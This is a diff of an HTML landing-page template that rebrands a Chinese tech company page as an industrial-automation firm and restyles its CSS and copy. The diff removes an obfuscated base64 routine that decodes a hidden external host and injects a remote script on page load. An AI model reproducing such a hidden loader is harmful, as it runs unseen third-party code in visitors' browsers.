@@ -3,8 +3,9 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>未来视野 - 智能解决方案</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>卓越智造 - 工业解决方案</title>
     <style>
         /* 全局样式 */
         body {
@@ -12,10 +13,10 @@
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #F4F7F6;
-            /* 浅灰绿色背景 */
-            color: #34495E;
-            /* 深蓝灰色文本 */
+            background-color: #F8F9FA;
+            /* 浅灰色背景 */
+            color: #343A40;
+            /* 深炭灰色文本 */
             line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
@@ -32,14 +33,13 @@
         .hero-section {
             position: relative;
             text-align: center;
-            padding: 80px 20px;
-            /* 更大的内边距 */
-            background-color: #1ABC9C;
-            /* 强调色：深青绿色 */
+            padding: 70px 20px;
+            /* 较大的内边距 */
+            background-color: #212529;
+            /* 深色背景，专业感 */
             color: #FFFFFF;
             overflow: hidden;
-            box-shadow: 0 10px 25px rgba(26, 188, 156, 0.4);
-            /* 强调色阴影 */
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
         }
 
         .hero-section::before {
@@ -50,7 +50,7 @@
             width: 100%;
             height: 100%;
             background: url('https://picsum.photos/1200/600?random=<%= new Date().getTime() %>') no-repeat center center/cover;
-            opacity: 0.15;
+            opacity: 0.1;
             /* 背景图片透明度 */
             z-index: 0;
         }
@@ -80,23 +80,24 @@
 
         .hero-button {
             display: inline-block;
-            background-color: #16A085;
-            /* 强调色深色 */
-            color: #FFFFFF;
+            background-color: #FFC107;
+            /* 强调色：琥珀黄 */
+            color: #212529;
+            /* 深色文本 */
             padding: 15px 35px;
             border-radius: 35px;
-            /* 更圆的按钮 */
             text-decoration: none;
             font-weight: bold;
             font-size: 1.2em;
             transition: background-color 0.3s ease, transform 0.3s ease;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            border: 2px solid #FFFFFF;
-            /* 白色边框 */
+            box-shadow: 0 5px 15px rgba(255, 193, 7, 0.4);
+            border: 2px solid #FFC107;
+            /* 强调色边框 */
         }
 
         .hero-button:hover {
-            background-color: #138D75;
+            background-color: #E0A800;
+            /* 强调色深色 */
             transform: translateY(-5px);
         }
 
@@ -110,39 +111,42 @@
             /* 移除默认阴影，由背景色块提供视觉分隔 */
             border-radius: 0;
             /* 移除圆角 */
+            text-align: center;
+            /* 默认居中 */
         }
 
         .section-light {
             background-color: #FFFFFF;
-            color: #34495E;
+            color: #343A40;
         }
 
         .section-dark {
-            background-color: #ECF0F1;
+            background-color: #E9ECEF;
             /* 浅灰背景 */
-            color: #34495E;
+            color: #343A40;
         }
 
         h2 {
-            color: #1ABC9C;
+            color: #FFC107;
             /* 强调色标题 */
             font-size: 2.2em;
             margin-bottom: 25px;
-            border-bottom: 2px solid rgba(26, 188, 156, 0.3);
+            border-bottom: 2px solid rgba(255, 193, 7, 0.3);
             /* 强调色分割线 */
             padding-bottom: 12px;
-            text-align: center;
+            display: inline-block;
+            /* 适应内容宽度 */
         }
 
         h3 {
-            color: #34495E;
+            color: #343A40;
             font-size: 1.5em;
             margin-top: 20px;
             margin-bottom: 15px;
         }
 
         p {
-            color: #4A627A;
+            color: #495057;
             font-size: 1.05em;
             margin-bottom: 20px;
             max-width: 800px;
@@ -159,6 +163,9 @@
             margin-bottom: 25px;
             display: block;
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15);
+            margin-left: auto;
+            /* 居中图片 */
+            margin-right: auto;
         }
 
         /* 服务/产品网格布局 */
@@ -189,7 +196,7 @@
         }
 
         .service-card h3 {
-            color: #1ABC9C;
+            color: #FFC107;
             /* 强调色 */
             font-size: 1.6em;
             margin-bottom: 10px;
@@ -223,26 +230,26 @@
         }
 
         .value-item:hover {
-            background-color: #F8FBFD;
+            background-color: #F8F9FA;
             /* 浅色背景 */
         }
 
         .value-item .icon {
             font-size: 3em;
             /* 图标大小 */
-            color: #1ABC9C;
+            color: #FFC107;
             margin-bottom: 15px;
         }
 
         .value-item h4 {
-            color: #34495E;
+            color: #343A40;
             font-size: 1.4em;
             margin-bottom: 10px;
         }
 
         .value-item p {
             font-size: 0.95em;
-            color: #5F7C8A;
+            color: #6C757D;
             margin-bottom: 0;
         }
 
@@ -259,14 +266,14 @@
         }
 
         .contact-info a {
-            color: #1ABC9C;
+            color: #FFC107;
             text-decoration: none;
             font-weight: bold;
             transition: color 0.3s ease;
         }
 
         .contact-info a:hover {
-            color: #16A085;
+            color: #E0A800;
         }
 
         .social-links {
@@ -277,28 +284,26 @@
         .social-links a {
             display: inline-block;
             margin: 0 15px;
-            color: #1ABC9C;
+            color: #FFC107;
             font-size: 2.5em;
-            /* 社交图标大小 */
             text-decoration: none;
             transition: transform 0.3s ease;
         }
 
         .social-links a:hover {
             transform: translateY(-5px);
-            color: #16A085;
+            color: #E0A800;
         }
 
         /* 页脚样式 */
         footer {
             text-align: center;
             padding: 30px 20px;
-            color: #7F8C8D;
+            color: #ADB5BD;
+            /* 浅灰色文本 */
             font-size: 0.9em;
-            background-color: #34495E;
-            /* 深蓝灰色背景 */
-            color: #ECF0F1;
-            /* 浅色文本 */
+            background-color: #212529;
+            /* 深色背景 */
             margin-top: 0;
             /* 与上一节紧密连接 */
         }
@@ -328,94 +333,87 @@
             }
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
     <div class="container">
         <header class="hero-section">
             <div class="hero-content">
-                <h1>未来视野</h1>
-                <p>以创新科技，赋能无限可能</p>
-                <a href="#contact" class="hero-button">立即联系</a>
+                <h1>卓越智造</h1>
+                <p>引领工业革新，铸就智能未来</p>
+                <a href="#contact" class="hero-button">立即咨询</a>
             </div>
         </header>
 
         <main>
             <section id="about" class="section-light">
                 <h2>关于我们</h2>
-                <p>未来视野科技是一家专注于前沿智能解决方案的创新企业。我们致力于将人工智能、大数据和云计算技术融入各行各业，帮助客户实现数字化转型，提升核心竞争力。</p>
-                <p>我们拥有一支充满激情、经验丰富的研发团队，始终坚持以客户为中心，以卓越的技术和专业的服务，为客户创造最大价值。</p>
-                <img src="https://picsum.photos/600/350?random=<%= new Date().getTime() + 1 %>" alt="团队在现代办公室讨论">
+                <p>卓越智造是一家专注于高端工业智能解决方案的创新型企业。我们致力于将前沿的自动化、物联网和人工智能技术应用于传统工业领域，帮助客户实现生产流程的智能化、高效化和可持续发展。</p>
+                <p>我们拥有一支由资深工程师和行业专家组成的精英团队，凭借深厚的技术积累和丰富的项目经验，为客户提供从咨询、设计到实施和维护的全方位服务。</p>
+                <img src="https://picsum.photos/600/350?random=<%= new Date().getTime() + 1 %>" alt="现代工业工厂内部">
             </section>
 
             <section id="services" class="section-dark">
                 <h2>我们的服务</h2>
                 <div class="services-grid">
                     <div class="service-card">
-                        <h3>人工智能研发</h3>
-                        <p>提供定制化AI模型开发、算法优化及智能系统集成服务。</p>
+                        <h3>智能工厂改造</h3>
+                        <p>提供MES、SCADA系统集成，实现生产数据实时监控与分析。</p>
                     </div>
                     <div class="service-card">
-                        <h3>大数据分析与可视化</h3>
-                        <p>从海量数据中挖掘深层洞察，通过直观可视化辅助决策。</p>
+                        <h3>工业机器人应用</h3>
+                        <p>设计与部署各类工业机器人，提升自动化水平和生产效率。</p>
                     </div>
                     <div class="service-card">
-                        <h3>云计算架构与部署</h3>
-                        <p>基于主流云平台，提供弹性、高效的云服务解决方案。</p>
+                        <h3>预测性维护</h3>
+                        <p>利用大数据和AI算法，实现设备故障的早期预警和维护优化。</p>
                     </div>
                     <div class="service-card">
-                        <h3>智能硬件集成</h3>
-                        <p>将软件智能与硬件设备融合，打造创新型智能产品。</p>
+                        <h3>工业物联网 (IIoT)</h3>
+                        <p>搭建IIoT平台，实现设备互联互通，数据高效采集与传输。</p>
                     </div>
                     <div class="service-card">
-                        <h3>行业解决方案</h3>
-                        <p>针对金融、医疗、零售等行业，提供垂直领域的智能应用。</p>
+                        <h3>定制化自动化设备</h3>
+                        <p>根据客户特定需求，研发并制造非标自动化生产设备。</p>
                     </div>
                 </div>
             </section>
 
             <section id="values" class="section-light">
-                <h2>我们的核心优势</h2>
+                <h2>我们的核心价值</h2>
                 <div class="values-grid">
+                    <div class="value-item">
+                        <div class="icon">⚙️</div>
+                        <h4>精益求精</h4>
+                        <p>追求卓越品质，打造行业标杆。</p>
+                    </div>
                     <div class="value-item">
                         <div class="icon">💡</div>
                         <h4>创新驱动</h4>
-                        <p>持续突破技术边界，引领行业发展。</p>
+                        <p>持续技术革新，赋能客户未来。</p>
                     </div>
                     <div class="value-item">
                         <div class="icon">🤝</div>
-                        <h4>客户至上</h4>
-                        <p>以客户需求为核心，提供卓越服务体验。</p>
-                    </div>
-                    <div class="value-item">
-                        <div class="icon">🏆</div>
-                        <h4>追求卓越</h4>
-                        <p>精益求精，确保产品与服务的高品质。</p>
+                        <h4>合作共赢</h4>
+                        <p>与客户携手，共创辉煌。</p>
                     </div>
                 </div>
             </section>
 
             <section id="contact" class="section-dark">
                 <h2>联系我们</h2>
-                <div class="contact-info">
-                    <p><strong>地址:</strong> 某某市高新科技园区创新路88号</p>
-                    <p><strong>电话:</strong> <a href="tel:+861234567890">+86 123 4567 890</a></p>
-                    <p><strong>邮箱:</strong> <a href="mailto:info@futurevision.com">info@futurevision.com</a></p>
-                    <p><strong>网址:</strong> <a href="http://www.futurevision.com"
-                            target="_blank">www.futurevision.com</a></p>
-                </div>
                 <div class="social-links">
                     <a href="#" aria-label="微信公众号">微信</a>
                     <a href="#" aria-label="领英">领英</a>
                     <a href="#" aria-label="微博">微博</a>
                 </div>
-                <img src="https://picsum.photos/600/350?random=<%= new Date().getTime() + 6 %>" alt="联系我们办公室场景">
+                <img src="https://picsum.photos/600/350?random=<%= new Date().getTime() + 6 %>" alt="工业控制室场景">
             </section>
         </main>
 
         <footer>
-            <p>&copy; 2023 未来视野科技. All rights reserved.</p>
+            <p>&copy; 2023 卓越智造. All rights reserved.</p>
         </footer>
         <div id="overlay">
             <div id="loading_box" class="loading_container">
@@ -459,53 +457,15 @@
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly95MHQycjRlLnBtbXlmZC5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
